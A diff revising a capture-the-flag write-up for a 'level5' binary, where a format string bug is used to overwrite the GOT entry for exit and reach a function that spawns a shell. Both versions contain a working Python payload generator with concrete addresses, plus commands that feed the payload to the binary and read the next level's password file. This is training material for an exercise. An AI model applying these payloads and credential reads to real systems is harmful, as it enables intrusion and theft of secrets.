@@ -2,7 +2,7 @@
 
 ## Binary analysis
 
-The binary is vulnerable to a format string attack. The function `n()` reads user input and prints it with `printf`, then calls `exit(1)`. The function `o()` spawns a shell with `system("/bin/sh")` and exits. The goal is to overwrite the GOT entry for `exit` with the address of `o()`, so that when `exit` is called, it jumps to `o()` instead.
+The function `n()` reads user input and prints it with `printf`, then calls `exit(1)`. The function `o()` spawns a shell with `system("/bin/sh")` and exits. The goal is to overwrite the GOT (global offset table) entry for `exit` with the address of `o()`, so that when `exit` is called, it jumps to `o()` instead.
 
 Relevant code:
 ```
@@ -30,39 +30,37 @@ Address of `o()`: 0x080484a4
 
 ## Exploitation
 
-We use a format string payload to overwrite the GOT entry for `exit` with the address of `o()`, byte by byte, using `%hhn`.
+We use a format string payload to overwrite the GOT entry for `exit` with the address of `o()` using `%hn`.
 
 Python script to generate the payload:
 ```python
-from struct import pack
-import sys
+import struct
 
-o_addr = 0x080484a4
-exit_got = 0x08049838
-addresses = [exit_got, exit_got+1, exit_got+2, exit_got+3]
-values = [o_addr & 0xff, (o_addr >> 8) & 0xff, (o_addr >> 16) & 0xff, (o_addr >> 24) & 0xff]
-n_arg = 4  # Offset to our addresses on the stack
+address = 0x08049838
+value_high = 0x0804
+value_low = 0x84a4
+offset = 4
 
-payload = b''.join(pack("<I", addr) for addr in addresses)
-written = len(payload)
-fmt = ""
-for i, val in enumerate(values):
-    to_write = (val - written) % 256
-    if to_write == 0:
-        fmt += f"%{n_arg + i}$hhn"
-    else:
-        fmt += f"%{to_write}c%{n_arg + i}$hhn"
-    written += to_write
+payload = struct.pack("<I", address + 2)
+payload += struct.pack("<I", address)
 
-payload += fmt.encode() + b"\n"
-with open("payload.txt", "wb") as f:
+padding_high = value_high - 8
+payload += f"%{padding_high}x".encode('ascii')
+payload += f"%{offset}$hn".encode('ascii')
+
+offset += 1
+padding_low = value_low - padding_high - 8
+payload += f"%{padding_low}x".encode('ascii')
+payload += f"%{offset}$hn".encode('ascii')
+
+with open('payload.txt', 'wb') as f:
     f.write(payload)
 ```
 
 ## Commands used
 
 ```
-(cat payload.txt; cat) | ./level5
+cat payload.txt - | ./level5
 ls
 cat /home/user/level6/.pass
 ```
